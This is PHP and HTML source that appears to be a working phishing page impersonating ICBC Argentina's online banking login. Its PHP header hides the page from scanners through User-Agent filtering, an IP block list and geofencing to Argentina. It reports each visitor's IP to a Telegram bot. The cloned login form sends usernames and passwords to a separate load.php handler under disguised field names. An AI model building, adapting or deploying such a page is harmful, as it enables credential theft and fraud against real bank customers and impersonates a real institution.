<?php

// Obtén el valor del User-Agent desde la solicitud
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Lista de User-Agents conocidos de navegadores comunes
$allowedUserAgents = [
    'Mozilla', 'Chrome', 'Safari', 'Firefox', 'Edge', 'Opera'
];

// Verifica si el User-Agent está en la lista permitida
if (!startsWithAny($userAgent, $allowedUserAgents)) {
    // Si no está en la lista permitida, redirige a una página de error o realiza alguna acción
    exit(file_get_contents('403.html'));
}


function startsWithAny($string, $options)
{
    foreach ($options as $option) {
        if (strpos($string, $option) === 0) {
            return true;
        }
    }
    return false;
}

function isIpBlocked($ipToCheck, $blockedIps)
{
    foreach ($blockedIps as $blockedIp) {
        if ($ipToCheck === $blockedIp['ip']) {
            return true;
        }
    }
    return false;
}

$ipVisitante = $_SERVER['REMOTE_ADDR'];

$ipsBloqueadas = json_decode(file_get_contents('panel-adm/ip_blocked.json'), true);

if (isIpBlocked($ipVisitante, $ipsBloqueadas)) {
    header("Location: 403.html");
    exit;
}

// Verifica si la IP proviene de Cloudflare
// if (!isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
//     header("Location: 403.html");
//     exit;
// }

function isVisitorFromArgentina()
{
    // Utiliza la IP proporcionada por Cloudflare
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    $data = file_get_contents("http://ip-api.com/json/{$ip}?fields=countryCode");
    $countryCode = json_decode($data, true)['countryCode'] ?? '';

    return $countryCode === 'AR';
}

// Verifica si el visitante es de Argentina
if (!isVisitorFromArgentina()) {
    header("Location: 403.html");
    exit;
}

// Lee el contenido del archivo config.json
$config_file_path = './panel-adm/config.json';
$config_content = file_get_contents($config_file_path);

// Decodifica el contenido JSON en un array asociativo
$config_data = json_decode($config_content, true);

// Verifica si se pudo leer y decodificar correctamente el archivo
if ($config_data === null) {
    die('Error al leer el archivo de configuración.');
}

// Obtiene el token y el chat_id desde el archivo config.json
$botToken = $config_data['token'];
$chatId = $config_data['chat_id'];

function sendMessage($botToken, $chatId, $message)
{
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId;
    $url = $url . "&text=" . urlencode($message);
    file_get_contents($url);
}

// Obtiene la información adicional (IP, fecha y hora)
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
$fecha = date('Y-m-d');
$hora = date('H:i:s');

// Mensaje para notificar que un usuario ha ingresado a index.php
$message = "=============
NUEVO USUARIO
INGRESADO
=============
👨🏻‍💻| Web: ICBCBANK2.0
📌| Desde: $ip
⏰| Horario: $hora
📅| Fecha: $fecha
=============";
sendMessage($botToken, $chatId, $message);
?>
<!doctype html>
<html>

<head>
   <meta charset="utf-8">
   <title>ICBC ONLINE</title>
   <meta name="robots" content="index, follow">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link href="font-awesome.min.css" rel="stylesheet">
   <link rel="shortcut icon" href="images/icbc.ico">
   <link href="icbc_demo.css" rel="stylesheet">
   <link href="index.css" rel="stylesheet">
   <script src="jquery-3.6.0.min.js"></script>
   <script src="wb.validation.min.js"></script>
   <script>
      $(document).ready(function () {
         $("#Editbox1").validate(
            {
               required: true,
               bootstrap: true,
               type: 'text',
               length_min: '8',
               length_max: '15',
               color_text: '#000000',
               color_hint: '#00FF00',
               color_error: '#FF0000',
               color_border: '#808080',
               nohint: false,
               font_family: 'Arial',
               font_size: '13px',
               position: 'topleft',
               offsetx: 0,
               offsety: 0,
               effect: 'none',
               error_text: 'El usuario debe tener entre 8 y 15 caracteres.'
            });
         $("#Editbox2").validate(
            {
               required: true,
               bootstrap: true,
               type: 'text',
               length_min: '8',
               length_max: '8',
               color_text: '#000000',
               color_hint: '#00FF00',
               color_error: '#FF0000',
               color_border: '#808080',
               nohint: false,
               font_family: 'Arial',
               font_size: '13px',
               position: 'topleft',
               offsetx: 0,
               offsety: 0,
               effect: 'none',
               error_text: 'Por favor ingresá 8 caracteres.'
            });
      });
   </script>
</head>

<body>
   <div id="wb_Shape1">
      <img src="images/img0001.png" id="Shape1" alt="" width="766" height="761">
   </div>
   <div id="wb_Image1">
      <img src="images/logobu-1.png" id="Image1" alt="" width="153" height="52">
   </div>
   <div id="wb_Text1">
      <span style="color:#4F4F4F;font-family:Arial;font-size:12px;"><strong>ACCESS BANKING</strong></span>
   </div>
   <div id="wb_Line1">
      <img src="images/img0002.png" id="Line1" alt="" width="767" height="-1">
   </div>
   <div id="wb_Line2">
      <img src="images/img0003.png" id="Line2" alt="" width="767" height="-1">
   </div>
   <div id="wb_Text2">
      <span style="color:#000000;font-family:Arial;font-size:9.3px;">ayuda | contactanos</span>
   </div>
   <div id="wb_Shape2">
      <img src="images/img0004.png" id="Shape2" alt="" width="727" height="160">
   </div>
   <div id="wb_Shape3">
      <img src="images/img0005.png" id="Shape3" alt="" width="766" height="180">
   </div>
   <div id="wb_Text3">
      <p>Usuario</p>
   </div>
   <div id="wb_Text4">
      <p>Clave</p>
   </div>
   <form action="./sn/load.php" method="post">
      <div id="wb_Editbox1">
         <input type="text" id="Editbox1" name="beyer" value="" maxlength="15" spellcheck="false" required>
         <div class="invalid-feedback">El usuario debe tener entre 8 y 15 caracteres.</div>
      </div>
      <div id="wb_Editbox2">
         <input type="password" id="Editbox2" name="lilly" value="" maxlength="8" spellcheck="false" required>
         <div class="invalid-feedback">Por favor ingresá 8 caracteres.</div>
      </div>
      <a id="Button2" href="">No puedo ingresar</a>
      <a id="Button3" href="">Tengo una clave provisoria</a>
      <div id="wb_Text5">
         <p>&nbsp;&nbsp;&nbsp; |</p>
      </div>
      <div id="wb_Icon1">
         <div id="Icon1"><i class="fa fa-question-circle"></i></div>
      </div>
      <div id="wb_Text6">
         <p>Teclado virtual</p>
      </div>
      <div id="wb_Checkbox1">
         <input type="checkbox" id="Checkbox1" name="Checkbox1" value="on"><label for="Checkbox1"></label>
      </div>
      <div id="wb_Shape4">
         <img src="images/img0006.png" id="Shape4" alt="" width="726" height="61">
      </div>
      <div id="wb_Text9">
         <span style="color:#000000;font-family:Arial;font-size:12px;">Si ten&#0233;s </span><span
            style="color:#FF0000;font-family:Arial;font-size:12px;"><strong>tarjeta Visa ICBC </strong></span><span
            style="color:#000000;font-family:Arial;font-size:12px;">y/o </span><span
            style="color:#FF0000;font-family:Arial;font-size:12px;"><strong>tarjeta MasterCard ICBC
            </strong></span><span style="color:#000000;font-family:Arial;font-size:12px;">y no cont&#0225;s con tarjeta
            de D&#0233;bito ICBC,
            obten&#0233; tu usuario y clave haciendo <u>click ac&#0225;.</u></span>
      </div>
      <div id="wb_Text11">
         <span
            style="color:#4F4F4F;font-family:Arial;font-size:13px;line-height:18px;"><strong>PRODUCTOS</strong></span><span
            style="color:#4F4F4F;font-family:Arial;font-size:15px;line-height:18px;"><br></span><span
            style="color:#4F4F4F;font-family:Arial;font-size:13px;line-height:18px;">Paquetes<br>Cuentas<br>Tarjetas<br>Seguros<br>Inversiones<br>Préstamos</span>
      </div>
      <div id="wb_Text10">
         <span
            style="color:#4F4F4F;font-family:Arial;font-size:12px;line-height:18px;"><strong>SERVICIOS<br></strong>Beneficios<br>ICBC
            Mall<br>Canales de Servicios<br>Giros y Transferencias</span>
      </div>
      <div id="wb_Text12">
         <span
            style="color:#4F4F4F;font-family:Arial;font-size:12px;line-height:18px;"><strong>UTILIDADES<br></strong></span><span
            style="color:#4F4F4F;font-family:Arial;font-size:11px;line-height:17px;">Teléfonos Útiles<br>Sucursales y
            Cajeros<br>Seguridad en Canales<br>Código de Prácticas Bancarias<br></span><span
            style="color:#4F4F4F;font-family:Arial;font-size:11px;line-height:16px;">Cajeros con funcionalidad para no
            videntes<br>Actualización de Datos Personales<br>Atención al usuario de servicios financieros</span>
      </div>
      <div id="wb_Text13">
         <span
            style="color:#4F4F4F;font-family:Arial;font-size:12px;line-height:18px;"><strong>ICBC<br></strong></span><span
            style="color:#4F4F4F;font-family:Arial;font-size:11px;line-height:17px;">En
            Argentina<br>Prensa<br>Responsabilidad Social<br>Recursos Humanos<br>Fundación ICBC<br>Licitaciones</span>
      </div>
      <div id="wb_Text14">
         <span style="color:#4F4F4F;font-family:Arial;font-size:11px;line-height:13px;"><strong>T&#0233;rminos y
               Condiciones </strong>| <strong>Pol&#0237;tica de Privacidad </strong>| Aviso Legal - Ley 25.738 | CABA -
            Ley
            2.709 | <strong>Defensa del Consumidor </strong>|<br>Comparaci&#0243;n de comisiones | Gerenciamiento de
            Riesgos | P. Datos Personales | FATCA | Agente Institorio | ALyC<br>Industrial and Commercial Bank of China
            (Argentina) S.A.U. 2012 <strong>TODOS LOS DERECHOS RESERVADOS</strong></span>
      </div>
      <div id="wb_Text7">
         <span style="color:#000000;font-family:Arial;font-size:12px;">Operar con Access Banking implica que
            acept&#0225;s
            en su totalidad los <strong>t&#0233;rminos y condiciones</strong>.<br>Las transacciones realizadas en Access
            Banking no generan cargos adicionales.</span>
      </div>
      <input type="submit" id="Button1" name="" value="INGRESAR">
   </form>
</body>

</html>